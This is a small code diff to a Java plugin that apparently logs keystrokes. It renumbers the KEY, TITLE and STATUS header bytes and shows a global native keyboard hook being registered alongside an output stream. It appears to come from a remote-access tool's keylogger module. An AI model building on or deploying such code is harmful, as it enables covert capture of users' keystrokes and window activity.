@@ -14,9 +14,9 @@ public class Plugin extends StubPlugin {
 	public static DataOutputStream dos;
 	public static boolean enabled;
 	
-	public static final byte KEY_HEADER = -75;
-	public static final byte TITLE_HEADER = -74;
-	public static final byte STATUS_HEADER = -73;
+	public static final byte KEY_HEADER = 121;
+	public static final byte TITLE_HEADER = 122;
+	public static final byte STATUS_HEADER = 123;
 	
 	public void onEnable() throws Exception {
 		GlobalScreen.registerNativeHook();
